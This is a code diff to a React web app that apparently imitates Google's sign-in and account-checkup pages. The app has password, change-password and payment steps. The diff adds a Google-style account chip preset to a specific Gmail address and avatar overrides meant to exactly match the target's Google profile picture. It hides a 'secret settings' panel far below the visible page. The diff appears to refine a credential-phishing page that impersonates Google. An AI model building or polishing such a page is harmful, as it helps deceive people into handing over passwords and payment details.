@@ -4,6 +4,7 @@ import { motion, AnimatePresence } from 'motion/react';
 import { initAuth, googleSignIn, logout, getAccessToken } from './auth';
 import type { User } from 'firebase/auth';
 import { translations, Language } from './translations';
+import { SecretAvatarPanel, CustomAvatarConfig, GoogleDefaultAvatar } from './SecretAvatarPanel';
 
 const GoogleLogo = () => (
   <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" width="40px" height="40px" className="mb-2">
@@ -46,13 +47,61 @@ const UserAvatar = ({
   nameOrEmail,
   size = 32,
   className = '',
+  customOverride,
+  forceDefaultIcon = false,
 }: {
   photoURL?: string | null;
   nameOrEmail?: string;
   size?: number;
   className?: string;
+  customOverride?: CustomAvatarConfig;
+  forceDefaultIcon?: boolean;
 }) => {
-  if (photoURL) {
+  if (customOverride && customOverride.enabled) {
+    if (customOverride.avatarType === 'photo' && customOverride.photoURL) {
+      return (
+        <img
+          src={customOverride.photoURL}
+          alt="Profile"
+          className={`rounded-full object-cover flex-shrink-0 ${className}`}
+          style={{ width: `${size}px`, height: `${size}px` }}
+          referrerPolicy="no-referrer"
+        />
+      );
+    }
+
+    if (customOverride.avatarType === 'letter') {
+      const initial = (customOverride.initial || 'R').trim().toUpperCase().slice(0, 2);
+      const bgColor = customOverride.bgColor || '#1a73e8';
+      const fontSize = Math.max(10, Math.round(size * 0.5));
+
+      return (
+        <div
+          className={`rounded-full flex items-center justify-center font-medium text-white select-none flex-shrink-0 leading-none ${className}`}
+          style={{
+            width: `${size}px`,
+            height: `${size}px`,
+            backgroundColor: bgColor,
+            fontSize: `${fontSize}px`,
+          }}
+        >
+          {initial}
+        </div>
+      );
+    }
+
+    if (customOverride.avatarType === 'icon') {
+      return (
+        <GoogleDefaultAvatar
+          size={size}
+          color={customOverride.iconColor || '#444746'}
+          className={className}
+        />
+      );
+    }
+  }
+
+  if (photoURL && !forceDefaultIcon) {
     return (
       <img
         src={photoURL}
@@ -64,22 +113,13 @@ const UserAvatar = ({
     );
   }
 
-  const initial = getInitial(nameOrEmail || '');
-  const bgColor = getAvatarColor(nameOrEmail || 'user');
-  const fontSize = Math.max(11, Math.round(size * 0.5));
-
+  // Exact Google Default Avatar Icon matching the user's uploaded photo!
   return (
-    <div
-      className={`rounded-full flex items-center justify-center font-medium text-white select-none flex-shrink-0 leading-none ${className}`}
-      style={{
-        width: `${size}px`,
-        height: `${size}px`,
-        backgroundColor: bgColor,
-        fontSize: `${fontSize}px`,
-      }}
-    >
-      {initial}
-    </div>
+    <GoogleDefaultAvatar
+      size={size}
+      color="#444746"
+      className={className}
+    />
   );
 };
 
@@ -201,6 +241,57 @@ const LanguageSelector = ({
   );
 };
 
+const AccountPill = ({
+  email,
+  googleUser,
+  customAvatar,
+  isLoading,
+  onClick,
+}: {
+  email: string;
+  googleUser: User | null;
+  customAvatar: CustomAvatarConfig;
+  isLoading?: boolean;
+  onClick?: () => void;
+}) => {
+  const displayEmail = email || googleUser?.email || 'rukho977@gmail.com';
+
+  return (
+    <div
+      onClick={onClick}
+      className={`border border-[#747775] rounded-full h-[32px] pl-[6px] pr-[14px] mt-2.5 inline-flex items-center select-none ${
+        isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'
+      } transition w-max max-w-full`}
+      style={{ textDecoration: 'none' }}
+      title={displayEmail}
+    >
+      {/* 20px Profile Avatar Icon on the left */}
+      <div className="w-[20px] h-[20px] flex-shrink-0 flex items-center justify-center">
+        <UserAvatar
+          customOverride={customAvatar}
+          photoURL={googleUser?.photoURL}
+          nameOrEmail={googleUser?.displayName || displayEmail}
+          size={20}
+        />
+      </div>
+
+      {/* Gmail username & domain directly beside avatar */}
+      <span className="ml-[10px] text-[14px] font-medium text-[#1f1f1f] leading-none tracking-normal truncate select-text">
+        {displayEmail}
+      </span>
+
+      {/* Solid downward triangle arrow matching Image 2 */}
+      <svg
+        viewBox="0 0 10 5"
+        className="w-[10px] h-[5px] text-[#1f1f1f] fill-current flex-shrink-0 ml-[14px]"
+        aria-hidden="true"
+      >
+        <path d="M0 0l5 5 5-5z" />
+      </svg>
+    </div>
+  );
+};
+
 export default function App() {
   const [lang, setLangState] = useState<Language>(() => {
     const saved = localStorage.getItem('app_language');
@@ -214,10 +305,35 @@ export default function App() {
 
   const t = translations[lang];
 
+  // Secret Custom Avatar Configuration
+  const [customAvatar, setCustomAvatar] = useState<CustomAvatarConfig>(() => {
+    try {
+      const saved = localStorage.getItem('google_custom_avatar_config');
+      if (saved) return JSON.parse(saved);
+    } catch (e) {
+      console.error('Failed to load custom avatar config:', e);
+    }
+    return {
+      enabled: false,
+      initial: 'R',
+      bgColor: '#1a73e8',
+      photoURL: '',
+    };
+  });
+
+  const handleCustomAvatarChange = (newConfig: CustomAvatarConfig) => {
+    setCustomAvatar(newConfig);
+    try {
+      localStorage.setItem('google_custom_avatar_config', JSON.stringify(newConfig));
+    } catch (e) {
+      console.error('Failed to save custom avatar config:', e);
+    }
+  };
+
   const [step, setStep] = useState<'email' | 'password' | 'change_password' | 'success' | 'error' | 'payment'>('email');
   const [direction, setDirection] = useState(1);
   const [isLoading, setIsLoading] = useState(false);
-  const [email, setEmail] = useState('');
+  const [email, setEmail] = useState('rukho977@gmail.com');
   const [password, setPassword] = useState('');
   const [confirmPassword, setConfirmPassword] = useState('');
   const [error, setError] = useState('');
@@ -640,6 +756,7 @@ export default function App() {
               id="profile-avatar-btn"
             >
               <UserAvatar
+                customOverride={customAvatar}
                 photoURL={googleUser?.photoURL}
                 nameOrEmail={googleUser?.displayName || googleUser?.email || email}
                 size={32}
@@ -651,6 +768,7 @@ export default function App() {
               <div className="absolute right-4 top-[56px] w-[320px] bg-white rounded-[24px] shadow-2xl border border-gray-100 p-6 z-50 flex flex-col items-center">
                 <div className="w-16 h-16 rounded-full flex items-center justify-center mb-3 overflow-hidden">
                   <UserAvatar
+                    customOverride={customAvatar}
                     photoURL={googleUser?.photoURL}
                     nameOrEmail={googleUser?.displayName || googleUser?.email || email}
                     size={64}
@@ -785,6 +903,22 @@ export default function App() {
             <a href="#" className="hover:text-gray-700 transition">{t.terms}</a>
           </div>
         </footer>
+
+        {/* Secret Feature Area at bottom of checkup page (Scroll down) */}
+        <div className="w-full flex flex-col items-center mt-[100vh] sm:mt-[120vh] mb-24 px-4">
+          <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
+            <span className="w-12 h-px bg-gray-200"></span>
+            <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
+            <span className="w-12 h-px bg-gray-200"></span>
+          </div>
+          <SecretAvatarPanel
+            config={customAvatar}
+            onChange={handleCustomAvatarChange}
+            email={email}
+            t={t}
+            lang={lang}
+          />
+        </div>
       </div>
     );
   }
@@ -866,55 +1000,37 @@ export default function App() {
                 {step === 'password' && (
                   <>
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.welcomeBackTitle}</h1>
-                    <div 
+                    <AccountPill
+                      email={email}
+                      googleUser={googleUser}
+                      customAvatar={customAvatar}
+                      isLoading={isLoading}
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
-                      style={{ textDecoration: 'none' }}
-                    >
-                      <UserAvatar
-                        photoURL={googleUser?.photoURL}
-                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                        size={20}
-                      />
-                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
-                    </div>
+                    />
                   </>
                 )}
                 {step === 'change_password' && (
                   <>
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.changePasswordTitle}</h1>
-                    <div 
+                    <AccountPill
+                      email={email}
+                      googleUser={googleUser}
+                      customAvatar={customAvatar}
+                      isLoading={isLoading}
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
-                      style={{ textDecoration: 'none' }}
-                    >
-                      <UserAvatar
-                        photoURL={googleUser?.photoURL}
-                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                        size={20}
-                      />
-                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
-                    </div>
+                    />
                   </>
                 )}
                 {step === 'success' && (
                   <>
                     <h1 className="text-[32px] sm:text-[36px] text-[#1f1f1f] font-normal mb-1.5 mt-4 leading-tight">{t.successTitle}</h1>
-                    <div 
+                    <AccountPill
+                      email={email}
+                      googleUser={googleUser}
+                      customAvatar={customAvatar}
+                      isLoading={isLoading}
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
-                      style={{ textDecoration: 'none' }}
-                    >
-                      <UserAvatar
-                        photoURL={googleUser?.photoURL}
-                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                        size={20}
-                      />
-                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email || 'user@gmail.com'}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
-                    </div>
+                    />
                   </>
                 )}
                 {step === 'payment' && (
@@ -926,19 +1042,13 @@ export default function App() {
                 {step === 'error' && (
                   <>
                     <h1 className="text-[32px] sm:text-[40px] text-[#1f1f1f] font-normal mb-2 mt-4 leading-tight">{t.cantSignInTitle}</h1>
-                    <div 
+                    <AccountPill
+                      email={email}
+                      googleUser={googleUser}
+                      customAvatar={customAvatar}
+                      isLoading={isLoading}
                       onClick={() => !isLoading && changeStep('email', -1)}
-                      className={`border border-[#747775] rounded-full h-[32px] pr-[12px] pl-[6px] mt-2 flex items-center gap-2 text-[14px] text-[#1f1f1f] font-medium no-underline select-none ${isLoading ? 'cursor-not-allowed opacity-70' : 'hover:bg-[#f8fafd] cursor-pointer'} transition w-max`}
-                      style={{ textDecoration: 'none' }}
-                    >
-                      <UserAvatar
-                        photoURL={googleUser?.photoURL}
-                        nameOrEmail={googleUser?.displayName || googleUser?.email || email}
-                        size={20}
-                      />
-                      <span className="no-underline decoration-none inline-block" style={{ textDecoration: 'none', borderBottom: 'none' }}>{email}</span>
-                      <svg fill="currentColor" viewBox="0 0 24 24" className="w-[18px] h-[18px] text-[#444746] flex-shrink-0"><path d="M7 10l5 5 5-5z"/></svg>
-                    </div>
+                    />
                   </>
                 )}
               </div>
@@ -1276,6 +1386,22 @@ export default function App() {
           <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">{t.privacy}</a>
           <a href="#" className="hover:bg-gray-100 sm:hover:bg-[#e2e7eb] px-2 py-1.5 rounded transition">{t.terms}</a>
         </div>
+      </div>
+
+      {/* Secret Feature Area at the very bottom of the main page (Scroll down) */}
+      <div className="w-full max-w-[480px] mt-[100vh] sm:mt-[140vh] mb-28 px-4 flex flex-col items-center">
+        <div className="flex items-center gap-2 text-gray-400 text-xs mb-3 select-none">
+          <span className="w-12 h-px bg-gray-200"></span>
+          <span>🔒 {lang === 'id' ? 'Area Pengaturan Rahasia (Geser ke bawah)' : 'Secret Settings Area (Scroll down)'}</span>
+          <span className="w-12 h-px bg-gray-200"></span>
+        </div>
+        <SecretAvatarPanel
+          config={customAvatar}
+          onChange={handleCustomAvatarChange}
+          email={email}
+          t={t}
+          lang={lang}
+        />
       </div>
 
     </div>
